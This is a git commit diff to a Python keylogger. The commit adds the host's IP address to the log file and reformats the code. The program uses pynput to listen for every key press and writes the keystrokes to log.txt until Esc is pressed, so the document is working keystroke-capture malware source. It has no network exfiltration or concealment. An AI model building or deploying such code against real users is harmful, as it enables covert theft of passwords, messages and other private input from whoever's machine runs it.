5acc78d9ed8a321a94b5e567fe8a3e3b7c793e65
Pedro Monteiro <pmapm@ua.pt>
2023-05-26 22:46:39 +0100

    add src IP address to log file

--- keylogger.py
+++ keylogger.py
@@ -1,4 +1,6 @@
-import pynput, sys 
+import pynput
+import sys
+import socket
 
 from pynput.keyboard import Key, Listener
 
@@ -9,16 +11,22 @@ def press(key):
 def release(key):
     if key is Key.esc:
         return False
-    
+
 def write_to_file(key):
     with open('log.txt', 'a') as f:
-        k = str(key).replace("'","") #remove ' from output file
-        if k.find("space") > 0:    
+        k = str(key).replace("'", "")  # remove ' from output file
+        if k.find("space") > 0:
             f.write(' ')
-        elif k.find("enter") > 0:    
+        elif k.find("enter") > 0:
             f.write('\n')
         elif k.find("Key") == -1:
             f.write(k)
+
+ip_address = socket.gethostbyname(socket.gethostname()) # get device IP address
+print("IP Address:", ip_address)
+
+with open('log.txt', 'w') as f: # write IP address to the log file
+    f.write("IP Address: {}\n".format(ip_address))
 
 with Listener(on_press=press, on_release=release) as listener:
     try:
